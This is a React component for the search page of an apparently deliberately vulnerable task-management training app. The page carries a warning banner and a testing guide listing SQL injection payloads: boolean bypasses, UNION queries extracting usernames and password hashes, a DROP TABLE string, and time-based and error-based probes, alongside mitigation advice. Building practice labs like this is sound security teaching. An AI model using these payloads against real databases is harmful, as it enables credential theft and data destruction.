import React, { useState } from 'react';
import { Task } from '../../types';
import SearchBar from './SearchBar';
import SearchResults from './SearchResults';
import { taskApi } from '../../utils/api';

interface SearchPageProps {
  onTaskClick?: (task: Task) => void;
  onBack?: () => void;
}

const SearchPage: React.FC<SearchPageProps> = ({ onTaskClick, onBack }) => {
  const [searchResults, setSearchResults] = useState<Task[]>([]);
  const [currentQuery, setCurrentQuery] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [searchPerformed, setSearchPerformed] = useState(false);

  const handleSearchResults = (results: Task[], query?: string) => {
    setSearchResults(results);
    setError(null);
    setSearchPerformed(true);
    if (query) {
      setCurrentQuery(query);
    }
  };

  const handleSearchError = (errorMessage: string) => {
    setError(errorMessage);
    setSearchResults([]);
    setSearchPerformed(true);
  };

  const handleSearchLoading = (loading: boolean) => {
    setIsLoading(loading);
    if (loading) {
      setError(null);
    }
  };

  const handleTaskEdit = async (task: Task) => {
    // For now, just log the edit attempt
    console.log('Edit task:', task);
    alert(`Edit functionality would open task ${task.id} for editing`);
  };

  const handleTaskDelete = async (taskId: number) => {
    if (!confirm('Are you sure you want to delete this task?')) {
      return;
    }

    try {
      await taskApi.deleteTask(taskId);
      
      // Remove from search results
      setSearchResults(prev => prev.filter(task => task.id !== taskId));
      
      alert('Task deleted successfully');
    } catch (error) {
      console.error('Failed to delete task:', error);
      alert('Failed to delete task: ' + (error instanceof Error ? error.message : 'Unknown error'));
    }
  };

  const handleStatusChange = async (taskId: number, status: Task['status']) => {
    try {
      await taskApi.updateTask(taskId, { status });
      
      // Update in search results
      setSearchResults(prev => prev.map(task => 
        task.id === taskId ? { ...task, status } : task
      ));
      
    } catch (error) {
      console.error('Failed to update task status:', error);
      alert('Failed to update task status: ' + (error instanceof Error ? error.message : 'Unknown error'));
    }
  };

  const handlePriorityChange = async (taskId: number, priority: Task['priority']) => {
    try {
      await taskApi.updateTask(taskId, { priority });
      
      // Update in search results
      setSearchResults(prev => prev.map(task => 
        task.id === taskId ? { ...task, priority } : task
      ));
      
    } catch (error) {
      console.error('Failed to update task priority:', error);
      alert('Failed to update task priority: ' + (error instanceof Error ? error.message : 'Unknown error'));
    }
  };

  return (
    <div className="mx-auto max-w-4xl space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-3xl font-bold text-gray-900">Search Tasks</h1>
          <p className="text-sm text-gray-600 mt-1">
            Search through tasks using our vulnerable search system
          </p>
        </div>
        
        {onBack && (
          <button
            onClick={onBack}
            className="flex items-center px-4 py-2 text-sm font-medium text-gray-700 bg-white border border-gray-300 rounded-md hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
          >
            <svg className="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 19l-7-7m0 0l7-7m-7 7h18" />
            </svg>
            Back to Tasks
          </button>
        )}
      </div>

      {/* Vulnerability Warning */}
      <div className="bg-red-50 border border-red-200 rounded-lg p-4">
        <div className="flex">
          <div className="flex-shrink-0">
            <svg className="h-5 w-5 text-red-400" viewBox="0 0 20 20" fill="currentColor">
              <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
            </svg>
          </div>
          <div className="ml-3">
            <h3 className="text-sm font-medium text-red-800">
              🚨 SQL Injection Vulnerability (CWE-89)
            </h3>
            <div className="mt-2 text-sm text-red-700">
              <p>This search functionality is intentionally vulnerable to SQL injection attacks for educational purposes.</p>
              <div className="mt-2 space-y-1">
                <div><strong>Try these payloads:</strong></div>
                <div className="font-mono text-xs bg-red-100 p-2 rounded">
                  <div>• <code>' OR '1'='1</code> - Basic boolean injection</div>
                  <div>• <code>' UNION SELECT id, email, password_hash FROM users--</code> - Union-based injection</div>
                  <div>• <code>'; DROP TABLE tasks; --</code> - Destructive injection (disabled in this demo)</div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Search Interface */}
      <div className="bg-white rounded-lg shadow border border-gray-200 p-6">
        <SearchBar
          onResults={handleSearchResults}
          onError={handleSearchError}
          onLoading={handleSearchLoading}
          placeholder="Search tasks... (Try SQL injection: ' OR '1'='1)"
          className="w-full"
        />
      </div>

      {/* Search Results */}
      {searchPerformed && (
        <SearchResults
          results={searchResults}
          query={currentQuery}
          loading={isLoading}
          error={error || undefined}
          onTaskClick={onTaskClick}
          onTaskEdit={handleTaskEdit}
          onTaskDelete={handleTaskDelete}
          onStatusChange={handleStatusChange}
          onPriorityChange={handlePriorityChange}
        />
      )}

      {/* Educational Information */}
      <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
        <h3 className="text-sm font-medium text-blue-800 mb-3">📚 Learning Objectives</h3>
        <div className="text-sm text-blue-700 space-y-2">
          <div><strong>Understanding SQL Injection:</strong></div>
          <ul className="list-disc list-inside space-y-1 ml-4">
            <li>Learn how unsanitized user input can be exploited</li>
            <li>Understand the impact of exposing database structure in errors</li>
            <li>See how attackers can extract sensitive data</li>
            <li>Practice identifying vulnerable code patterns</li>
          </ul>
          
          <div className="mt-3"><strong>Mitigation Techniques:</strong></div>
          <ul className="list-disc list-inside space-y-1 ml-4">
            <li>Use parameterized queries or prepared statements</li>
            <li>Implement proper input validation and sanitization</li>
            <li>Apply the principle of least privilege for database access</li>
            <li>Use ORM frameworks that handle SQL injection prevention</li>
            <li>Implement proper error handling that doesn't expose database details</li>
          </ul>
        </div>
      </div>

      {/* SQL Injection Testing Guide */}
      <div className="bg-gray-50 border border-gray-200 rounded-lg p-4">
        <h3 className="text-sm font-medium text-gray-800 mb-3">🧪 SQL Injection Testing Guide</h3>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm text-gray-700">
          <div>
            <div className="font-medium mb-2">Basic Injection Tests:</div>
            <div className="space-y-1 font-mono text-xs bg-white p-3 rounded border">
              <div>' OR '1'='1</div>
              <div>' OR 1=1--</div>
              <div>admin'--</div>
              <div>' OR 'x'='x</div>
            </div>
          </div>
          
          <div>
            <div className="font-medium mb-2">Union-Based Injection:</div>
            <div className="space-y-1 font-mono text-xs bg-white p-3 rounded border">
              <div>' UNION SELECT null, username, password FROM users--</div>
              <div>' UNION SELECT id, email, password_hash FROM users--</div>
              <div>' UNION SELECT table_name FROM information_schema.tables--</div>
            </div>
          </div>
          
          <div>
            <div className="font-medium mb-2">Time-Based Blind Injection:</div>
            <div className="space-y-1 font-mono text-xs bg-white p-3 rounded border">
              <div>'; SELECT pg_sleep(5)--</div>
              <div>' OR (SELECT COUNT(*) FROM users) &gt; 0 AND pg_sleep(3)--</div>
            </div>
          </div>
          
          <div>
            <div className="font-medium mb-2">Error-Based Injection:</div>
            <div className="space-y-1 font-mono text-xs bg-white p-3 rounded border">
              <div>' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--</div>
              <div>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--</div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default SearchPage;